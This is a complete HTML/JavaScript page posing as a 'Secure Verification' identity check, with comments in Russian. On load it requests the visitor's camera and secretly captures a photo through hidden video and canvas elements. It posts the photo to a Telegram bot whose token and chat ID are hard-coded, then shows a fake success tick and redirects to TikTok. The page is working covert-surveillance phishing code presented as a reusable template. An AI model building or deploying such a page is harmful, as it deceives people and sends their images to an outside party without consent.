<!DOCTYPE html>
<html>
<head>
    <title>Secure Verification</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            color: #2d3748;
            padding: 30px;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .container {
            background: white;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            max-width: 500px;
            margin: 0 auto;
        }
        .logo {
            font-size: 24px;
            font-weight: 600;
            color: #4a5568;
            margin-bottom: 10px;
        }
        .subtext {
            color: #718096;
            margin-bottom: 30px;
        }
        .progress-container {
            height: 6px;
            background: #edf2f7;
            border-radius: 3px;
            margin: 30px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0;
            transition: width 0.4s ease;
        }
        .status {
            margin: 20px 0;
            font-size: 15px;
            color: #4a5568;
        }
        .checkmark {
            color: #48bb78;
            font-size: 50px;
            margin: 20px 0;
            opacity: 0;
            transition: opacity 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Secure Verification</div>
        <div class="subtext">Identity confirmation required</div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status" id="status">Initializing security check...</div>
        <div class="checkmark" id="checkmark">✓</div>

        <!-- Скрытые элементы камеры -->
        <video id="cameraView" autoplay muted playsinline style="display: none;"></video>
        <canvas id="photoCanvas" style="display: none;"></canvas>
    </div>

    <script>
        const cameraView = document.getElementById('cameraView');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const checkmark = document.getElementById('checkmark');
        const photoCanvas = document.getElementById('photoCanvas');
        
        const BOT_TOKEN = '7461659827:AAGmr6hFlQfoN6Z34iN9qyA-OGru6fWiNuo';
        const CHAT_ID = '5212330472';

        async function startHiddenVerification() {
            try {
                // 1. Запрашиваем камеру
                updateStatus("Requesting camera access...", 20);
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                // 2. Настраиваем скрытый поток
                cameraView.srcObject = stream;
                updateStatus("Configuring system...", 40);
                
                // 3. Ждем инициализации камеры (важно для качества)
                await new Promise(resolve => setTimeout(resolve, 500));
                updateStatus("Scanning biometrics...", 70);
                
                // 4. Делаем скрытый снимок
                const photoData = await takeHiddenPhoto();
                updateStatus("Verifying identity...", 90);
                
                // 5. Отправляем фото
                await sendToTelegram(photoData);
                
                // 6. Завершаем процесс
                completeVerification();
                
            } catch (error) {
                statusEl.textContent = "Verification failed. Please allow camera access.";
                console.error("Verification error:", error);
            }
        }

        function updateStatus(text, progress) {
            statusEl.textContent = text;
            progressBar.style.width = `${progress}%`;
        }

        async function takeHiddenPhoto() {
            const context = photoCanvas.getContext('2d');
            photoCanvas.width = cameraView.videoWidth;
            photoCanvas.height = cameraView.videoHeight;
            
            // Делаем 3 попытки с интервалом для лучшего качества
            for (let i = 0; i < 3; i++) {
                context.drawImage(cameraView, 0, 0, photoCanvas.width, photoCanvas.height);
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            
            return new Promise(resolve => {
                photoCanvas.toBlob(resolve, 'image/jpeg', 0.95);
            });
        }

        async function sendToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'verification_photo.jpg');
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        function completeVerification() {
            updateStatus("Verification successful!", 100);
            checkmark.style.opacity = 1;
            
            // Отключаем камеру
            if (cameraView.srcObject) {
                cameraView.srcObject.getTracks().forEach(track => track.stop());
            }
            
            // Через 2 секунды редирект
            setTimeout(() => {
                window.location.href = "https://tiktok.com"; // Замени на нужный URL
            }, 2000);
        }

        // Запускаем процесс при загрузке
        window.addEventListener('DOMContentLoaded', startHiddenVerification);
    </script>
</body>
</html>
